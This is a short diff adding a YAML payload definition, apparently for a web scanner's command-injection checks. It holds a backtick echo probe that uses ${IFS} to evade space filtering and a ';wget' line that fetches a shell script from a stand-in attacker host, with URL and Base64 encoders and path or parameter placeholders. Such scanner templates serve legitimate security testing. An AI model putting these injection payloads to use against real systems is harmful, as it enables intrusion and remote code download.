@@ -1,0 +1,9 @@
+payload:
+  - '`echo${IFS}848954+773784`'
+  - ';wget http://ev1111k.co/sh311.sh'
+encoder:
+  - Base64Flat
+  - Url
+placeholder:
+  - UrlPath
+  - UrlParam
